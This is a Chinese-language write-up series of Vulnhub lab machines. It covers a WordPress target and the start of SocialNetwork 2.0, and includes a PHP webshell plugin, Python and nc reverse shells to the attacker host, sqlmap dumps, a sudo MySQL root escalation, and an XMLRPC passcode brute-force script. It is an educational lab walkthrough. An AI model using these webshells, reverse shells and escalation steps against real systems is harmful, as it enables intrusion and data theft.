<p>目标：取得2个flag，获得root权限</p>
<p><strong>涉及的攻击方法</strong>：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>web路径爆破（目录扫描）</li>
<li>BP自动替换</li>
<li>密码爆破</li>
<li>MSF漏洞利用</li>
<li>Wordpress漏洞利用</li>
<li>NC反弹shell升级：nc反弹的shell是残缺的，比如缺少文件名补全。这个方法就是获得完整的shell。</li>
<li>蚁剑上线</li>
<li>利用MySQL提权</li>
</ul>
<h1 id="配置信息">配置信息</h1>
<p>这里使用NAT模式。配置很简单，只需要在virtual box中的全局设定中添加一张网卡，然后虚拟机选择NAT模式，此时会自动选择刚刚创建的网卡。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402214433.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402214443.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402214459.png" /></p>
<h1 id="单用户模式">单用户模式</h1>
<p>本题的虚拟机无法扫描到IP。因此进入单用户模式，修改网卡名称即可。具体可以看<a href="https://mp.weixin.qq.com/s?__biz=MjM5NjI1OTc5Mw==&amp;mid=2652172616&amp;idx=1&amp;sn=f72eaf0db6af6e9ec68e17ed30479852&amp;chksm=bd0ba3f68a7c2ae09cd08de9006e86c417ac27ca3d11f603aa30d14fe402b2b5cb4bc55a5545&amp;scene=126&amp;&amp;sessionid=1648903615#rd">修改网卡</a></p>
<p><strong>步骤</strong>：</p>
<p>在启动或者重启，显示virtual box那个界面之后黑屏的时候，按住方向键上，进入如下界面：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403204842.png" /></p>
<p>此时按 e，进入如下界面，找到红框位置：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403204947.png" /></p>
<p>将红框的内容修改为如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403205050.png" /></p>
<p>一定要是 rw，否则无法修改配置文件！</p>
<p>然后按<code>ctrl+x</code>或者F10启动。然后输入<code>ip a</code>查看网卡信息：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403205339.png" /></p>
<p>查看网络配置文件中的网卡名称（该靶机的系统是Ubuntu，因此选第二个）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># RedHat Linux</span><br><span class="line">vi /etc/network/interfaces</span><br><span class="line"></span><br><span class="line"># UBUNTU</span><br><span class="line">vi /etc/netplan/00-installer-config.yaml</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403205436.png" /></p>
<p>将 ens33 修改成功网卡信息中的红框位置的名字。然后保存并退出，重启计算机即可获得IP。</p>
<h1 id="渗透">渗透</h1>
<p>kali：10.0.2.4</p>
<h2 id="主机发现">主机发现</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 10.0.2.0/24</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402214748.png" /></p>
<p>1,2,3其实都不是；4是kali，因此靶机IP为10.0.2.5</p>
<h2 id="端口扫描">端口扫描</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p1-65535 10.0.2.5</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402215226.png" /></p>
<p>只开了一个80端口</p>
<h2 id="端口服务发现">端口服务发现</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p80 -sV 10.0.2.5</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402215338.png" /></p>
<ol type="1">
<li>靶机系统是Ubuntu</li>
<li>80端口上的服务是http</li>
<li>apache 版本 2.4.13</li>
</ol>
<h2 id="访问http服务">访问http服务</h2>
<p>访问之后发现就是一个apache的页面，没有其他信息，因此直接进行web路径扫描。这里使用新的工具feroxbuster。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">feroxbuster --url http://10.0.2.5</span><br></pre></td></tr></table></figure></p>
<p>（注意，如果报错仔细看信息，可能是因为没有字典）</p>
<p>该工具不自带字典，因此有两种方法：</p>
<ul>
<li><code>sudo apt install seclists</code> 安装字典</li>
<li>自己指定字典</li>
</ul>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402222016.png" /></p>
<p>虽然都是301，但是301是重定向，并不是不存在，因此可以尝试访问。注意到两个东西：</p>
<ol type="1">
<li>出现了很多的 wordpress</li>
<li>还有一个admin，这个可能是后台地址</li>
</ol>
<p>我们先访问 wordpress，发现页面过了很久才加载出来。而admin更是直接无法访问。因此，聚焦在 <code>http://10.0.2.5/wordpress/</code> 上，<strong>这里能够加载出页面，但是速度很慢，这是为什么呢？因此尝试抓包看一下</strong>。发现了异常：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402222458.png" /></p>
<p>我们只访问了 10.0.2.5，但是数据包却出现了 192.168.159.145，这并不是该网段的IP，此时想起了前面的301，因此猜测，这是后台重定向到了192那个IP地址。</p>
<p>查看响应包：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402222730.png" /></p>
<p>发现 192.168.159.145 有20个匹配，这说明后台将重定向的IP地址写死了。不论谁访问10.0.2.5都会被重定向到192.168.159.145，这一看就是内网地址。<strong>因此，接下来的思路就是不让靶机请求192.168.159.145的资源，而是让它请求10.0.2.5的资源</strong>。</p>
<h2 id="bp自动替换">BP自动替换</h2>
<p>进入BP修改以下信息：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402223246.png" /></p>
<p>此时刷新页面，成功加载！</p>
<p>接下来进行web功能点测试，测试之后发现，没有存在可利用的漏洞。忽然想起之前有一个wp-admin目录，尝试访问一下。出现后台登录界面！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402223545.png" /></p>
<h2 id="密码爆破">密码爆破</h2>
<p>看见登录框，首先尝试一下万能密码，发现行不通。但是在测试过程中发现有时候会提示<code>wrong username</code>，有时候却提示<code>The password you entered for the username **admin** is incorrect.</code>。这说明存在着admin这个用户。并且测试过程中发现可以随便实验，没有次数、时间限制，也没有验证码，因此可以采用密码爆破！</p>
<p>密码爆破首先得知道用户名，有两个方法：</p>
<ol type="1">
<li>根据报错信息</li>
<li>搜索相关CMS的默认管理员、普通账户</li>
</ol>
<p>使用BP进行爆破，这里推荐使用<a href="https://github.com/fuzz-security/SuperWordlist">superwordlist</a>中的MidPwds.txt这个字典。（由于这个字典太多了，kali自带的BP不是pro，爆破速度太慢了，因此我自定义了100个进行演示）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403204448.png" /></p>
<p>可以发现只有adam14的响应包长度与其他的不同，并且设置了许多的cookie，然后重定向到 wp-admin，因此，有理由猜测这就是密码，回到登录界面尝试，发现登录成功！因此，最终发现密码是adam14。（如果提示验证邮箱选择左下角的稍后提醒）</p>
<h2 id="后台get-shell">后台get shell</h2>
<p>后台get shell的方式一般有以下三种（本题为例）：</p>
<ol type="1">
<li>Media里面的文件上传功能，上传后门</li>
<li>Appearance里theme模板（PHP文件）的修改</li>
<li>plugins修改现有的插件的php，或者手动写插件然后上传（上传的webshell要找到路径）</li>
</ol>
<h3 id="第一种">第一种</h3>
<p>不论是否免杀，都无法上传</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402231623.png" /></p>
<h3 id="第二种">第二种</h3>
<p>注意到刚进来后台的时候写着使用的主题是<code>Twenty Twenty-One</code>。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402231928.png" /></p>
<p>发现不可以修改文件。</p>
<h3 id="第三种">第三种</h3>
<p>推荐自己写一个插件然后上传。如果没有上传功能，那就修改现有插件。这里有上传功能。</p>
<p>先查看现有的两个插件的写法，发现有一个共同点，那就是头文件！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402232516.png" /></p>
<p>得包含这些东西</p>
<p>因此，写一个如下插件： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Plugin Name: webshell</span></span><br><span class="line"><span class="comment">* Plugin URI: https://hdfzzf.github.io</span></span><br><span class="line"><span class="comment">* Descritption: WP webshell for pentest</span></span><br><span class="line"><span class="comment">* Version: 1.0</span></span><br><span class="line"><span class="comment">* Author: hdfzzf</span></span><br><span class="line"><span class="comment">* Author URI: https://hdfzzf.github.io</span></span><br><span class="line"><span class="comment">* License: https://hdfzzf.github.io</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	system(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>（经过测试，如果不写头部信息，插件安装会不成功）</p>
<p>安装成功后需要激活插件</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402233227.png" /></p>
<p>现在需要知道插件上传之后的路径。网络搜索发现该CMS插件的路径是<code>/wordpress/wp-content/plugins/</code>。因此访问<code>10.0.2.5/wordpress/wp-content/plugins/shell.php?shell=id</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402234611.png" /></p>
<p>成功执行了命令。</p>
<p>这里可以使用：</p>
<ol type="1">
<li>python反弹shell</li>
<li>nc拿shell</li>
<li>msf</li>
</ol>
<p>kali监听 3333 端口，然后网页输入如下命令： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>也可以通过nc串联：</p>
<p>kali监听两个端口，然后网页执行下面 命令： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc 10.0.2.4 3333|/bin/bash|nc 10.0.2.4 4444</span><br></pre></td></tr></table></figure></p>
<p>不过这里再介绍一种，那就是msf反弹shell。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. msfconsole  启动msf</span><br><span class="line">2. search wordpress admin</span><br><span class="line">3. use 2  选择第二个</span><br><span class="line">4. show options</span><br><span class="line">5. 设置参数</span><br><span class="line">6. run</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402235756.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402235736.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402235840.png" /></p>
<p>成功！</p>
<h2 id="shell升级">shell升级</h2>
<p>提权获得的shell是残缺的，无法完成互动操作，比如修改代码，自动补齐。因此，接下来需要升级（以python get shell做示范。该方法只针对bash） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">2. ctrl+z 将获得的shell暂停，切到后台</span><br><span class="line">3. stty raw -echo</span><br><span class="line">4. fg 将刚刚放入后台的进程切到前台</span><br><span class="line">5. export SHELL=/bin/bash</span><br><span class="line">6. export TERM=screen</span><br><span class="line">7. stty rows 38 columns 116 设置大小</span><br><span class="line">8. reset</span><br><span class="line">9. shell成功升级</span><br><span class="line"></span><br><span class="line">注意：如果kali使用的是zsh，需要切换为bash。</span><br><span class="line">	1. chsh -s /bin/bash（不能加sudo，否则修改的是root的shell）</span><br><span class="line">	2. 重启</span><br><span class="line">	3. echo $SHELL 确认一下</span><br></pre></td></tr></table></figure></p>
<p><strong>如果利用nc获得一个shell，容易不小心按ctrl+c或者某种原因退出了shell。并且，有的web程序不能多次触发漏洞反弹shell（可能触发一次后环境就变了，只能等待对方重启服务器）。因此，获得一个shell后，应该基于这个shell去获得2-3个shell，比如一句话木马</strong></p>
<p>回想刚刚后台get shell的第二种方法，此时已经获得了shell，因此可以修改php文件（或者添加php文件）来用其他工具连接，比如蚁剑。</p>
<p>这里修改主题里面的404.php文件，也就是刚刚修改不成功的那个。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403193531.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403202613.png" /></p>
<p>成功连接</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403202630.png" /></p>
<p>这就是为什么要进行shell升级，否则无法该代码，用蚁剑连接。</p>
<h2 id="信息收集">信息收集</h2>
<p>发现了<code>/home</code>目录下有一个用户 wpadmin</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403193944.png" /></p>
<p>并且在wpadmin的目录下，有一个txt文件，猜测这就是flag文件，但经过测试，现在的权限不够查看。</p>
<p>还在<code>/root</code>目录下发现一个txt文件，这应该是另一个flag文件，但遗憾的是，还是没有权限。</p>
<p>查看用户<code>cat /etc/passwd</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403194131.png" /></p>
<p>查看系统内核<code>uname -a</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403194203.png" /></p>
<p>查看sudo配置，发现权限不够。</p>
<p>查看wordpress目录下的配置文件：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403194406.png" /></p>
<p>发现了数据库的名称，用户名和密码。</p>
<p>信息收集差不多了，接下来就需要进行提权了。</p>
<h2 id="权限提升">权限提升</h2>
<h3 id="wpadmin权限">wpadmin权限</h3>
<p>想起刚刚查看wordpress配置文件的时候发现了用户名和密码，因此尝试登录wpadmin试试，尝试失败。这时候想到，刚刚密码爆破还有一个密码，因此再次尝试，发现成功。密码是：adam14</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403195257.png" /></p>
<p>此时可以先读取第一个flag</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403195341.png" /></p>
<h3 id="root权限">root权限</h3>
<p>（如果刚刚没有升级shell，这里无法连接数据库！！！） 刚刚发现得到了系统内核，用msf查找，发现没有漏洞可以利用。</p>
<p>接下来查看sudo配置 <code>sudo -l</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403195815.png" /></p>
<p>发现，wpadmin可以以root权限启动数据库，因此，输入下面的命令启动数据库，经过尝试，密码也是adam14。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /urs/bin/mysql -u root -D wordpress -p</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403195950.png" /></p>
<p>成功登录数据库。</p>
<blockquote>
<p>小知识：数据库可以利用 system cmd 执行系统命令。这里我们是以root方式启动的数据库，因此使用system执行命令的时候也是root权限。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403200101.png" /></p>
<p>执行 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system /bin/bash -i</span><br><span class="line"></span><br><span class="line">-i 表示shell表示bash是交互的。其实这里不加也没关系</span><br></pre></td></tr></table></figure></p>
<p>获得root权限的shell</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403200246.png" /></p>
<p>成功拿到flag，也成功得到root权限。至此，这个靶机结束！</p>
<h1 id="总结">总结</h1>
<p>通过对该靶机的渗透，学到了MySQL的提权方式，对该靶机来说，归根结底还是sudo配置不当。</p>
<p>其次，知道了如果请求一个网页反应慢，可能是因为后台源码请求某个IP地址，该IP地址在原来的环境下是靶机的IP内网IP地址，所以在原来的环境下请求速度正常，但是一旦移植到自己的环境，比如虚拟机，那么就会出问题。此时，就可以利用BP的自动替换，将代码中写死的IP地址改为当前靶机的IP地址。</p>
<p>最后，就是学习了如何将“残缺的”shell升级为交互式的shell。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>MySQL提取</tag>
        <tag>shell升级</tag>
        <tag>BP自动替换</tag>
      </tags>
  </entry>
  <entry>
    <title>5. Vulvhub SocialNetwork2.0 Writeup</title>
    <url>/2022/04/06/5.%20Vulnhub%20SocialNetwork2.0%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度困难，涉及到逆向（不会！）。这个靶机的难点就是在缓冲区溢出漏洞。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：<a href="https://www.vulnhub.com/entry/boredhackerblog-social-network-20,455/">social_network_2.0</a></p>
<p>难度：Hard</p>
<p>虚拟机软件：Virtual Box</p>
<p>目标：获得root权限</p>
<p><strong>涉及的攻击方法</strong>：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>SQL注入</li>
<li>文件上传</li>
<li>蚁剑上线</li>
<li>CVE利用</li>
<li><strong>XMLRPC命令执行</strong></li>
<li><strong>动态调试</strong></li>
<li><strong>漏洞利用代码编写</strong></li>
</ul>
<h1 id="渗透">渗透</h1>
<p>kali：10.0.2.4</p>
<h2 id="主机发现">主机发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 10.0.2.0/24</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405203809.png" /></p>
<p>靶机IP为：10.0.2.8</p>
<h2 id="端口扫描">端口扫描</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.8</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405203853.png" /></p>
<p>靶机开了2个端口：80，8000</p>
<h2 id="端口服务发现">端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 10.0.2.8</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405204014.png" /></p>
<ol type="1">
<li>80和8000端口的服务都是http</li>
<li>靶机系统是Ubuntu</li>
<li>80端口上的CMS是Apache，版本为2.4.29</li>
<li>8000端口上的服务是BaseHTTPServer，版本为0.3</li>
<li>靶机上有python2的环境</li>
</ol>
<h2 id="访问http服务">访问http服务</h2>
<p>首先访问8000端口，发现提示信息 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error code 501.</span><br><span class="line">Message: Unsupported method (&#x27;GET&#x27;).</span><br><span class="line">Error code explanation: 501 = Server does not support this operation. </span><br></pre></td></tr></table></figure></p>
<p>简而言之就是服务端不接受GET请求方式。因此，我们换请求方式，但是在尝试了所有请求方式后发现都不行。这个端口的思路到此就断了。</p>
<p>那访问80端口，发现是一个登录界面</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405204512.png" /></p>
<p>首先尝试万能密码，但被提示<code>invalid email format</code>。因此，就需要换一个思路。<strong>注意到该网址有一个<code>Sign Up</code>功能，因此，接下来应该先注册一个账号，然后收集登陆进去的信息</strong>。这是非常重要的思路！</p>
<p>进去之后发现这是一个类似微博一样的功能，注意到除了我之外还有两个用户<code>admin admin</code> 和<code>testuser testuers</code>。还注意到有一个<strong>搜索框</strong>以及头像可以<strong>上传文件</strong>！</p>
<h2 id="蚁剑上线">蚁剑上线</h2>
<p>先测试上传文件功能点。上传一个一句话，然后鼠标右键头像，打开链接，发现成功打开，并且得到文件的路径。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405205340.png" /></p>
<p>直接使用蚁剑连接。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405205811.png" /></p>
<h2 id="sql注入">SQL注入</h2>
<p>测试刚刚那个搜索框，先输入一个单引号，发现报错了，因此，存在SQL注入，并且数据库为MySQL</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405210036.png" /></p>
<p>直接用sqlmap <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. sqlmap -r r.txt -p query <span class="comment"># 其中r.txt保存的是搜索的请求数据包</span></span><br><span class="line">2. sqlmap -r r.txt -p query --dbs</span><br><span class="line">3. sqlmap -r r.txt -p query -D socialnetwork --tables</span><br><span class="line">4. sqlmap -r r.txt -p query -D socialnetwork -T users --columns</span><br><span class="line">5. sqlmap -r r.txt -p query -D socialnetwork -T users -C user_email,user_password --dump</span><br></pre></td></tr></table></figure></p>
<p>成功获得邮箱和密码的hash值，一般密码都是md5加密的，因此解密之后得到下表：</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">email</th>
<th style="text-align: center;">encryPasswd</th>
<th style="text-align: center;">passwd</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><code>admin@localhost.com</code></td>
<td style="text-align: center;">21232f297a57a5a743894a0e4a801fc3</td>
<td style="text-align: center;">admin</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>21232f297a57a5a743894a0e4a801fc3</code></td>
<td style="text-align: center;">5d9c68c6c50ed3d02a2fcf54f63993b6</td>
<td style="text-align: center;">testuser</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>hdfzzf@123.com</code></td>
<td style="text-align: center;">249abd700757d98f77fa6ff4f0c2a750</td>
<td style="text-align: center;">hdfzzf</td>
</tr>
</tbody>
</table>
<p>此时就可以使用admin的邮箱和密码登录。</p>
<p>发现一条靶机系统上有一个<code>monitor.py</code>脚本。其他并没有什么特别的。</p>
<h2 id="反弹shell">反弹shell</h2>
<p>蚁剑获得的shell功能不够，因此需要用nc反弹或者python，然后进行shell升级。</p>
<p>kali先监听3333端口，然后蚁剑shell上执行下面命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.0.2.4 3333 &gt;/tmp/f</span><br></pre></td></tr></table></figure></p>
<p>然后进行shell升级，和之前一样，这里不多赘述</p>
<h2 id="cve-2021-3493提权">CVE-2021-3493提权</h2>
<p>Ubuntu有一个CVE-2021-3493，可以直接进行本地提权。</p>
<p>漏洞利用下载地址：<a href="https://github.com/briskets/CVE-2021-3493">CVE-2021-3493</a></p>
<p>下载完之后，编译之后发送到靶机。然后再执行该exp即可。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405214049.png" /></p>
<p>成功提权。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405214121.png" /></p>
<p>这样子似乎很快，但是这台靶机是2020年出的，而该漏洞是2021年爆出的，因此，回归当年的环境，用别的方法提权。</p>
<h2 id="信息收集">信息收集</h2>
<p>下面命令可以获得具体发行版本 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406110128.png" /></p>
<p>发现与<code>/bin/bahs</code>有关的用户： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd|grep /bin/bash</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405214351.png" /></p>
<p>发现两个用户。这里其他信息收集的过程就不多赘述了。</p>
<p>记得刚刚有一个脚本<code>monitor.py</code>，在<code>/home/socnet</code>目录下找到了它，查看源码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#my remote server management API</span></span><br><span class="line"><span class="keyword">import</span> SimpleXMLRPCServer</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">debugging_pass = random.randint(<span class="number">1000</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runcmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    results = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span><br><span class="line">    output = results.stdout.read() + results.stderr.read()</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cpu</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;cat /proc/cpuinfo&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mem</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;free -m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">disk</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;df -h&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">net</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;ip a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secure_cmd</span>(<span class="params">cmd,passcode</span>):</span></span><br><span class="line">    <span class="keyword">if</span> passcode==debugging_pass:</span><br><span class="line">         <span class="keyword">return</span> runcmd(cmd)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wrong passcode.&quot;</span></span><br><span class="line"></span><br><span class="line">server = SimpleXMLRPCServer.SimpleXMLRPCServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>))</span><br><span class="line">server.register_function(cpu)</span><br><span class="line">server.register_function(mem)</span><br><span class="line">server.register_function(disk)</span><br><span class="line">server.register_function(net)</span><br><span class="line">server.register_function(secure_cmd)</span><br><span class="line"></span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure></p>
<p>这里有一个技术：<a href="https://docs.python.org/zh-cn/3/library/xmlrpc.html">XMLRPC</a></p>
<p>（这个脚本也解释了为什么在访问8000端口的时候不接受所有的请求方式！）</p>
<p>简单来说就是客户端可以通过该技术调用服务端提供的函数。而查看进程发现，该脚本处于运行状态。通过代码审计发现，靶机作为服务端启动服务，并且有多个函数，注意到最后一个<code>secure_cmd</code>，只要满足条件，就能够执行任意代码。我们并不知道<code>debugging_pass</code>值是多少，这是通过随机函数在脚本刚执行时随机的一个值，但是也就几千个，直接爆破即可。</p>
<h2 id="第一次权限提升xmlrpc命令执行">第一次权限提升——XMLRPC命令执行</h2>
<p>编写如下脚本爆破<code>debugging_pass</code>： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"><span class="keyword">with</span> xmlrpc.client.ServerProxy(<span class="string">&quot;http://10.0.2.8:8000/&quot;</span>) <span class="keyword">as</span> proxy:</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>, <span class="number">10000</span>):</span><br><span class="line">		r = <span class="built_in">str</span>(proxy.secure_cmd(<span class="string">&quot;whoami&quot;</span>, i))</span><br><span class="line">	    <span class="keyword">if</span> <span class="string">&quot;Wrong&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">		    <span class="built_in">print</span>(r)</span><br><span class="line">		    <span class="built_in">print</span>(<span class="string">&quot;the value of debugging_pass is %d&quot;</span> % i)</span><br><span class="line">		    <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405221433.png" /></p>
<p>得到<code>debugging_pass=5166</code>，并且发现执行的结果是<code>socnet</code>。如果利用该脚本反弹shell，那么获得的shell就是<code>socnet</code>的。</p>
<p>此时再次执行nc反弹 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"><span class="keyword">with</span> xmlrpc.client.ServerProxy(<span class="string">&quot;http://10.0.2.8:8000/&quot;</span>) <span class="keyword">as</span> proxy:</span><br><span class="line">    cmd = <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.0.2.4 4444 &gt;/tmp/f&quot;</span></span><br><span class="line">    p = <span class="number">5166</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the script is running:&quot;</span>)</span><br><span class="line">    proxy.secure_cmd(cmd, p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;over!&quot;</span>)</span><br></pre></td></tr></table></figure></p>
